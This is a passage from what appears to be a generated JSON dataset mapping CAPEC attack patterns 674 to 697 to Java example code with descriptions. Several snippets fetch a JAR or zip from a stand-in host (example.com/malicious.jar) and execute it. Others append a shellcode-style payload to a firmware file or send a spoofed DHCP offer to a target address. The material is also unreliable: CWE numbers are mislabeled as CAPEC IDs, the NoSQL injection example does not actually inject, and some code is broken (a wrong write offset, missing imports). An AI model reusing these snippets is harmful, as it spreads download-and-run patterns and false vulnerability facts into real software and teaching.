        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousSoftware {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"malicious.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n\n            // Load the downloaded JAR file (potentially malicious)\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"malicious.jar\").toURI().toURL()});\n            Class<?> clazz = classLoader.loadClass(\"com.example.MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n\n            // CWE-506: Embedded Malicious Code\n            maliciousCode.run();\n\n            // CWE-215: Insertion of Sensitive Information Into Debugging Code\n            System.out.println(\"Debug: Sensitive information: \" + System.getenv(\"SECRET_KEY\"));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a developer inadvertently signs and distributes software that has been maliciously altered. The code downloads a JAR file from a remote location without verifying its integrity (CWE-494). It then loads and executes a class from the downloaded JAR, which could contain malicious code (CWE-506). Additionally, the code prints sensitive information to the console for debugging purposes (CWE-215). This represents the CAPEC scenario where a developer unknowingly signs and distributes software that has been compromised during the development or build process."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "public class FPGAMaliciousAlteration {\n    private static boolean securityCheckEnabled = true;\n\n    public static void main(String[] args) {\n        // Simulate FPGA configuration reload\n        reloadFPGAConfiguration();\n\n        // Perform security-critical operation\n        if (securityCheckEnabled) {\n            performSecurityCriticalOperation();\n        } else {\n            System.out.println(\"Security check bypassed!\");\n        }\n    }\n\n    private static void reloadFPGAConfiguration() {\n        // Maliciously alter the FPGA configuration\n        securityCheckEnabled = false; // CWE-506: Embedded Malicious Code\n    }\n\n    private static void performSecurityCriticalOperation() {\n        // Security-critical code that should not be optimized away\n        System.out.println(\"Performing security-critical operation...\");\n    }\n}",
        "description": "This Java code snippet simulates the malicious alteration of an FPGA configuration, embodying the main idea of the CAPEC. The `reloadFPGAConfiguration` method represents the adversary's action of altering the FPGA configuration to disable a security check (CWE-506: Embedded Malicious Code). The `main` method checks if the security check is enabled before performing a security-critical operation. If the security check is bypassed, it prints a message indicating the bypass. This snippet also hints at potential issues related to processor or compiler optimizations that could remove or modify security-critical code (CWE-1037 and CWE-733)."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class DecommissionedDeviceHandler {\n    public static void main(String[] args) {\n        String sensitiveData = \"Sensitive Information\";\n        File file = new File(\"sensitiveData.txt\");\n\n        // Simulate writing sensitive data to a file\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Simulate decommissioning the device without proper data scrubbing\n        decommissionDevice(file);\n    }\n\n    private static void decommissionDevice(File file) {\n        // Improper scrubbing of sensitive data (CWE-1266, CWE-1301)\n        if (file.delete()) {\n            System.out.println(\"Device decommissioned, but data may still be recoverable.\");\n        } else {\n            System.out.println(\"Failed to decommission device.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the improper handling of sensitive data during the decommissioning of a device. The code writes sensitive information to a file and then attempts to decommission the device by deleting the file. However, simply deleting the file does not ensure that the data is unrecoverable, embodying the vulnerabilities described in CWE-1266 (Improper Scrubbing of Sensitive Data from Decommissioned Device) and CWE-1301 (Insufficient or Incomplete Data Removal within Hardware Component). This represents the main idea of the CAPEC, where sensitive data can be retrieved from decommissioned devices if not properly scrubbed."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "import com.mongodb.MongoClient;\nimport com.mongodb.client.MongoCollection;\nimport com.mongodb.client.MongoDatabase;\nimport org.bson.Document;\n\npublic class NoSQLInjectionExample {\n    public static void main(String[] args) {\n        MongoClient mongoClient = new MongoClient(\"localhost\", 27017);\n        MongoDatabase database = mongoClient.getDatabase(\"testdb\");\n        MongoCollection<Document> collection = database.getCollection(\"users\");\n\n        // User input that is not properly sanitized\n        String userInput = \"admin' || '1'=='1\";\n\n        // Vulnerable query construction\n        Document query = new Document(\"username\", userInput);\n\n        // Executing the query\n        Document user = collection.find(query).first();\n\n        if (user != null) {\n            System.out.println(\"User found: \" + user.toJson());\n        } else {\n            System.out.println(\"User not found\");\n        }\n\n        mongoClient.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a NoSQL injection vulnerability in a MongoDB query. The code connects to a MongoDB database and constructs a query using user input without proper sanitization. The user input is directly embedded into the query, which can be exploited by an attacker to manipulate the query logic. In this example, the input 'admin' || '1'=='1' is used to bypass authentication checks, potentially allowing unauthorized access to user data. This snippet embodies the main idea of CAPEC-943, CAPEC-1286, and related CWEs by showing how improper neutralization and validation of user input can lead to security vulnerabilities in NoSQL databases."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class MaliciousFirmwareUpdater {\n    private static final String FIRMWARE_PATH = \"/path/to/firmware.bin\";\n    private static final String MALICIOUS_PAYLOAD = \"\\x90\\x90\\x90\\x90\"; // NOP sled for shellcode\n\n    public static void main(String[] args) {\n        try {\n            // Simulate firmware update process\n            updateFirmware(FIRMWARE_PATH, MALICIOUS_PAYLOAD.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void updateFirmware(String firmwarePath, byte[] payload) throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(firmwarePath, true)) {\n            // Append malicious payload to firmware\n            fos.write(payload);\n            System.out.println(\"Firmware updated with malicious payload.\");\n        }\n    }\n}",
        "description": "This Java code snippet simulates a malicious firmware update process, embodying the concept of a 'Server Motherboard Compromise' (CAPEC). The code demonstrates how an adversary might insert malicious code into a server's firmware during an update. The `updateFirmware` method appends a malicious payload (represented as a NOP sled) to the firmware file. This action aligns with CWE-506 (Embedded Malicious Code) and CWE-509 (Replicating Malicious Code). The code also indirectly touches on CWE-497 (Exposure of Sensitive System Information) and CWE-1262 (Improper Access Control for Register Interface) by implying that the firmware update process lacks proper security controls, allowing unauthorized modifications."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class BuildConfig {\n    public static void main(String[] args) {\n        String configPath = \"/tmp/build_config.txt\";\n        try {\n            // CWE-377: Insecure Temporary File\n            File configFile = new File(configPath);\n            if (!configFile.exists()) {\n                configFile.createNewFile();\n            }\n\n            // CWE-426: Untrusted Search Path\n            String buildData = new String(Files.readAllBytes(Paths.get(configPath)));\n            System.out.println(\"Build Data: \" + buildData);\n\n            // CWE-913: Improper Control of Dynamically-Managed Code Resources\n            String maliciousData = \"malicious_data\";\n            FileWriter writer = new FileWriter(configFile);\n            writer.write(maliciousData);\n            writer.close();\n\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            System.out.println(\"Error: Failed to write to \" + configPath + \". Data: \" + maliciousData);\n        } catch (IOException e) {\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable build configuration process. It embodies the CAPEC 'System Build Data Maliciously Altered' by showing how build data can be misconfigured. The code creates and uses an insecure temporary file (CWE-377), reads from an untrusted search path (CWE-426), improperly controls dynamically-managed code resources by writing malicious data to the configuration file (CWE-913), and generates an error message containing sensitive information (CWE-209). Additionally, it exposes sensitive system information through exception handling (CWE-497). This snippet highlights the risks of improper handling of build configuration data and the potential for malicious alteration."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "public class MemoryProtectionExample {\n    private static final int PROTECTED_REGION_START = 0x1000;\n    private static final int PROTECTED_REGION_END = 0x2000;\n    private static final int UNPROTECTED_REGION_START = 0x2000;\n    private static final int UNPROTECTED_REGION_END = 0x3000;\n\n    private static byte[] memory = new byte[0x4000];\n\n    public static void main(String[] args) {\n        // Simulate writing to protected region\n        writeMemory(0x1500, (byte) 0xAA); // Should be protected but is not\n\n        // Simulate writing to unprotected region\n        writeMemory(0x2500, (byte) 0xBB); // Unprotected and writable\n\n        // Simulate reading from protected region\n        byte data = readMemory(0x1500); // Should be protected but is not\n        System.out.println(\"Data read from protected region: \" + data);\n    }\n\n    private static void writeMemory(int address, byte value) {\n        if (address >= PROTECTED_REGION_START && address < PROTECTED_REGION_END) {\n            System.out.println(\"Warning: Writing to protected region!\");\n        }\n        memory[address] = value;\n    }\n\n    private static byte readMemory(int address) {\n        if (address >= PROTECTED_REGION_START && address < PROTECTED_REGION_END) {\n            System.out.println(\"Warning: Reading from protected region!\");\n        }\n        return memory[address];\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where memory protection is improperly configured, allowing unauthorized read and write operations to a protected memory region. The `writeMemory` and `readMemory` methods simulate writing to and reading from memory, respectively. The code includes checks to identify when operations are performed on a protected region, but it does not enforce any actual protection, thus embodying the main idea of CAPEC-1222 and related CWEs. Specifically, it highlights issues such as insufficient granularity of address regions (CWE-1222), improper access control (CWE-1257), and overlapping protected and unprotected regions (CWE-1316)."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "public class RegisterAccess {\n    private static final int LOCK_BIT = 0x1;\n    private int controlRegister = 0x0;\n    private boolean lockBitSet = false;\n\n    public void setControlRegister(int value) {\n        if (!lockBitSet) {\n            controlRegister = value;\n        } else {\n            System.out.println(\"Error: Control register is locked.\");\n        }\n    }\n\n    public void setLockBit() {\n        lockBitSet = true;\n    }\n\n    public void resetLockBit() {\n        lockBitSet = false; // CWE-1231: Improper Prevention of Lock Bit Modification\n    }\n\n    public int getControlRegister() {\n        return controlRegister;\n    }\n\n    public static void main(String[] args) {\n        RegisterAccess regAccess = new RegisterAccess();\n        regAccess.setControlRegister(0xFF);\n        regAccess.setLockBit();\n        regAccess.resetLockBit(); // Vulnerability: lock bit can be reset\n        regAccess.setControlRegister(0xAA); // Vulnerability: control register can be modified after lock bit reset\n        System.out.println(\"Control Register: \" + regAccess.getControlRegister());\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of register access control. The `RegisterAccess` class contains a control register and a lock bit. The `setControlRegister` method allows setting the control register value only if the lock bit is not set. The `setLockBit` method sets the lock bit, preventing further modifications to the control register. However, the `resetLockBit` method allows the lock bit to be reset, which is a vulnerability (CWE-1231: Improper Prevention of Lock Bit Modification). This allows an adversary to modify the control register even after the lock bit has been set, embodying the main idea of the CAPEC: Exploitation of Improperly Controlled Registers."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "public class SoCSecurityManager {\n    private static final String DEFAULT_SECURITY_TOKEN = \"DEFAULT_TOKEN\";\n    private Map<String, String> entityTokens = new HashMap<>();\n\n    public SoCSecurityManager() {\n        // Initialize with some default tokens\n        entityTokens.put(\"entity1\", \"TOKEN1\");\n        entityTokens.put(\"entity2\", \"TOKEN2\");\n    }\n\n    public boolean validateTransaction(String entityId, String token) {\n        String expectedToken = entityTokens.getOrDefault(entityId, DEFAULT_SECURITY_TOKEN);\n        return expectedToken.equals(token);\n    }\n\n    public void performAction(String entityId, String token) {\n        if (validateTransaction(entityId, token)) {\n            System.out.println(\"Action performed for entity: \" + entityId);\n        } else {\n            System.out.println(\"Invalid token for entity: \" + entityId);\n        }\n    }\n\n    public static void main(String[] args) {\n        SoCSecurityManager manager = new SoCSecurityManager();\n\n        // Example of a valid transaction\n        manager.performAction(\"entity1\", \"TOKEN1\");\n\n        // Example of an invalid transaction due to incorrect token\n        manager.performAction(\"entity1\", \"WRONG_TOKEN\");\n\n        // Example of a transaction with missing security identifier\n        manager.performAction(\"entity3\", \"\");\n    }\n}",
        "description": "This Java code snippet represents a simplified System-on-Chip (SoC) security manager that uses security tokens to control access to actions. The `SoCSecurityManager` class maintains a map of entity IDs to their corresponding security tokens. The `validateTransaction` method checks if the provided token matches the expected token for the given entity. The `performAction` method performs an action if the token is valid, otherwise, it denies the action. The main method demonstrates valid and invalid transactions, including a case where a transaction is attempted with a missing security identifier. This code embodies the main idea of CAPEC by showing how improperly controlled or missing security identifiers can lead to unauthorized actions."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "public class FirmwareUpdate {\n    private static final boolean IS_UPDATEABLE = false;\n    private static final String FIRMWARE_VERSION = \"1.0.0\";\n\n    public static void main(String[] args) {\n        if (!IS_UPDATEABLE) {\n            System.out.println(\"Firmware version \" + FIRMWARE_VERSION + \" is not updateable.\");\n            // Simulate exploitation of unpatchable vulnerability\n            exploitVulnerability();\n        } else {\n            System.out.println(\"Firmware is updateable.\");\n            // Code to update firmware would go here\n        }\n    }\n\n    private static void exploitVulnerability() {\n        // Simulated exploit code\n        System.out.println(\"Exploiting unpatchable vulnerability in firmware version \" + FIRMWARE_VERSION);\n        // Potentially harmful actions could be performed here\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a device's firmware is not updateable, embodying the main idea of the CAPEC 'Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities'. The 'IS_UPDATEABLE' flag is set to false, indicating that the firmware cannot be updated. The 'main' method checks this flag and, if the firmware is not updateable, it simulates the exploitation of a vulnerability by calling the 'exploitVulnerability' method. This method represents the potential actions an adversary could take to exploit the unpatchable firmware. The code highlights the risk associated with devices that cannot be updated to address vulnerabilities, aligning with the related CWEs such as 'Firmware Not Updateable' and 'Reliance on Component That is Not Updateable'."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MetadataSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"downloaded.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, bytesRead, bytesRead);\n            }\n            in.close();\n            fos.close();\n\n            // CWE-348: Use of Less Trusted Source\n            // CWE-290: Authentication Bypass by Spoofing\n            // CWE-1230: Exposure of Sensitive Information Through Metadata\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            // Load the downloaded JAR file without verifying its integrity\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"downloaded.jar\");\n            Process p = pb.start();\n            p.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where metadata spoofing can occur. The code downloads a JAR file from a remote URL without performing any integrity checks (CWE-494). This downloaded file could be malicious, and the code proceeds to execute it without verifying its source or integrity, representing a use of a less trusted source (CWE-348). Additionally, the code does not authenticate the source of the download, making it susceptible to spoofing attacks (CWE-290). The example also highlights the risk of exposing sensitive information through metadata (CWE-1230) and incorrectly specifying the destination in a communication channel (CWE-941). This snippet embodies the main idea of CAPEC- Metadata Spoofing, where an adversary can alter the metadata to present a malicious resource as legitimate."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-library.jar\";\n        String fileName = \"malicious-library.jar\";\n        try {\n            downloadFile(url, fileName);\n            Runtime.getRuntime().exec(\"java -jar \" + fileName);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable downloader that fetches a JAR file from a remote URL and executes it without verifying its integrity or origin. The `downloadFile` method downloads the file from the specified URL and saves it locally. The `main` method then executes the downloaded JAR file using `Runtime.getRuntime().exec`. This code embodies the CAPEC 'Spoof Open-Source Software Metadata' by potentially allowing an adversary to spoof the metadata of the downloaded file, making it appear as a trusted library. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the lack of verification of the downloaded file, CWE-348 (Use of Less Trusted Source) is implied by the use of an untrusted URL, CWE-506 (Embedded Malicious Code) is represented by the potential for the downloaded file to contain malicious code, CWE-290 (Authentication Bypass by Spoofing) is indirectly related as the code does not authenticate the source, and CWE-1395 (Dependency on Vulnerable Third-Party Component) is implied by the reliance on an external, potentially vulnerable component."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableVCS {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-repo.zip\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"repo.zip\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Unzip the downloaded repository (CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere)\n            Process unzipProcess = Runtime.getRuntime().exec(\"unzip repo.zip -d /path/to/repo\");\n            unzipProcess.waitFor();\n\n            // CWE-348: Use of Less Trusted Source\n            File repoDir = new File(\"/path/to/repo\");\n            if (repoDir.exists()) {\n                System.out.println(\"Repository downloaded and extracted.\");\n            } else {\n                System.out.println(\"Failed to extract repository.\");\n            }\n\n            // CWE-540: Inclusion of Sensitive Information in Source Code\n            File sensitiveFile = new File(\"/path/to/repo/.git/config\");\n            if (sensitiveFile.exists()) {\n                BufferedReader br = new BufferedReader(new FileReader(sensitiveFile));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    System.out.println(line);\n                }\n                br.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a version control system (VCS) repository is downloaded and extracted without verifying its integrity (CWE-494). The repository is then exposed to an unauthorized control sphere (CWE-527) by extracting it to a local directory. The code also uses a less trusted source (CWE-348) by not verifying the authenticity of the downloaded repository. Additionally, it includes sensitive information in the source code (CWE-540) by reading and printing the contents of the .git/config file. This example embodies the main idea of the CAPEC by showing how an adversary could spoof VCS commit metadata to deceive users into trusting and using a malicious repository."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-package.jar\";\n        String fileName = \"malicious-package.jar\";\n        try {\n            downloadFile(url, fileName);\n            executeFile(fileName);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static void executeFile(String fileName) throws IOException {\n        Runtime.getRuntime().exec(\"java -jar \" + fileName);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software downloader that embodies the concept of 'StarJacking'. The code downloads a JAR file from a specified URL and executes it without verifying the origin or integrity of the file (CWE-494). This could allow an adversary to spoof software popularity metadata, making users believe the package is trustworthy. The downloaded file could contain embedded malicious code (CWE-506). Additionally, the code does not check if the source is trusted (CWE-348) and could depend on a vulnerable third-party component (CWE-1395). This example highlights the risks associated with downloading and executing code from untrusted sources without proper verification."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import java.util.TimeZone;\nimport java.util.Locale;\nimport java.util.Properties;\n\npublic class SystemLocationDiscovery {\n    public static void main(String[] args) {\n        // Collecting system timezone\n        TimeZone timeZone = TimeZone.getDefault();\n        String timeZoneID = timeZone.getID();\n        System.out.println(\"System Timezone: \" + timeZoneID);\n\n        // Collecting system locale\n        Locale locale = Locale.getDefault();\n        String language = locale.getLanguage();\n        String country = locale.getCountry();\n        System.out.println(\"System Language: \" + language);\n        System.out.println(\"System Country: \" + country);\n\n        // Collecting system properties\n        Properties properties = System.getProperties();\n        String userHome = properties.getProperty(\"user.home\");\n        String osName = properties.getProperty(\"os.name\");\n        System.out.println(\"User Home Directory: \" + userHome);\n        System.out.println(\"Operating System: \" + osName);\n    }\n}",
        "description": "This Java code snippet demonstrates the collection of system information that can be used to identify the system's geographical location and other sensitive details. The code gathers the system's timezone, locale (language and country), and some system properties such as the user's home directory and the operating system name. This information can be useful for an adversary to confirm the target system and tailor further attacks. The code embodies the main idea of CAPEC-160 (System Location Discovery) and highlights potential vulnerabilities related to CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing sensitive system information that could be accessed by unauthorized actors."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class RepoJackingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-repo.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"malicious-repo.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new URL(\"file:malicious-repo.jar\")});\n            Class<?> clazz = classLoader.loadClass(\"com.malicious.MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n            maliciousCode.run();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application downloads a JAR file from a remote location without verifying its integrity (CWE-494). It then loads and executes a class from this untrusted JAR file (CWE-829). This embodies the concept of 'Repo Jacking' where an adversary can trick users into incorporating malicious code into their applications by exploiting the redirect property of directly linked VCS repositories. The code highlights the risks of downloading and executing code from untrusted sources, which can lead to the execution of malicious functionality."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "import java.nio.ByteBuffer;\nimport java.security.SecureRandom;\n\npublic class LoadValueInjectionExample {\n    private static final int BUFFER_SIZE = 64;\n    private static final SecureRandom random = new SecureRandom();\n\n    public static void main(String[] args) {\n        byte[] secretData = new byte[BUFFER_SIZE];\n        random.nextBytes(secretData); // Simulate secret data\n\n        // Simulate a page fault or microcode assist\n        try {\n            byte[] attackerControlledData = new byte[BUFFER_SIZE];\n            random.nextBytes(attackerControlledData); // Attacker-controlled data\n\n            // Transient execution: access attacker-controlled data\n            byte transientData = transientLoad(attackerControlledData);\n\n            // Use side-channel analysis to infer secret data\n            if (transientData == secretData[0]) {\n                System.out.println(\"Secret data leaked!\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static byte transientLoad(byte[] data) throws Exception {\n        // Simulate transient execution by accessing data\n        return data[0];\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of Load Value Injection (LVI) by simulating transient execution and side-channel analysis. The code initializes a buffer with secret data and another buffer with attacker-controlled data. It then simulates a transient load operation that accesses the attacker-controlled data. By comparing the transiently loaded data with the secret data, it demonstrates how an attacker might infer secret information through side-channel analysis. This example embodies the main idea of CAPEC-1342, CAPEC-1423, CAPEC-1422, and CAPEC-1421 by showing how transient execution can expose sensitive information through microarchitectural state and incorrect data forwarding."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class DHCPSpoofing {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] dhcpOffer = createDHCPOffer();\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.100\"); // Target client IP\n        DatagramPacket packet = new DatagramPacket(dhcpOffer, dhcpOffer.length, targetAddress, 68); // Port 68 for DHCP client\n        socket.send(packet);\n        System.out.println(\"Sent spoofed DHCP offer to \" + targetAddress.getHostAddress());\n    }\n\n    private static byte[] createDHCPOffer() {\n        // Simplified DHCP offer packet (not a real DHCP packet)\n        return new byte[]{\n            (byte) 0x02, // Message type: Boot Reply (2)\n            (byte) 0x01, // Hardware type: Ethernet\n            (byte) 0x06, // Hardware address length: 6\n            (byte) 0x00, // Hops\n            // Transaction ID (4 bytes)\n            (byte) 0x39, (byte) 0x03, (byte) 0xF3, (byte) 0x26,\n            // Seconds elapsed (2 bytes)\n            (byte) 0x00, (byte) 0x00,\n            // Bootp flags (2 bytes)\n            (byte) 0x00, (byte) 0x00,\n            // Client IP address (4 bytes)\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            // Your (client) IP address (4 bytes)\n            (byte) 0xC0, (byte) 0xA8, (byte) 0x01, (byte) 0x64, // 192.168.1.100\n            // Next server IP address (4 bytes)\n            (byte) 0xC0, (byte) 0xA8, (byte) 0x01, (byte) 0x01, // 192.168.1.1\n            // Relay agent IP address (4 bytes)\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            // Client MAC address (16 bytes)\n            (byte) 0x00, (byte) 0x0C, (byte) 0x29, (byte) 0x3E, (byte) 0x1C, (byte) 0x7B,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            // Server host name (64 bytes)\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            // Boot file name (128 bytes)\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,\n            // Magic cookie (4 bytes)\n            (byte) 0x63, (byte) 0x82, (byte) 0x53, (byte) 0x63,\n            // DHCP options (variable length)\n            (byte) 0x35, (byte) 0x01, (byte) 0x02, // Option 53: DHCP Message Type (Offer)\n            (byte) 0x36, (byte) 0x04, (byte) 0xC0, (byte) 0xA8, (byte) 0x01, (byte) 0x01, // Option 54: DHCP Server Identifier\n            (byte) 0x33, (byte) 0x04, (byte) 0x00, (byte) 0x01, (byte) 0x51, (byte) 0x80, // Option 51: IP Address Lease Time\n            (byte) 0x01, (byte) 0x04, (byte) 0xFF, (byte) 0xFF, 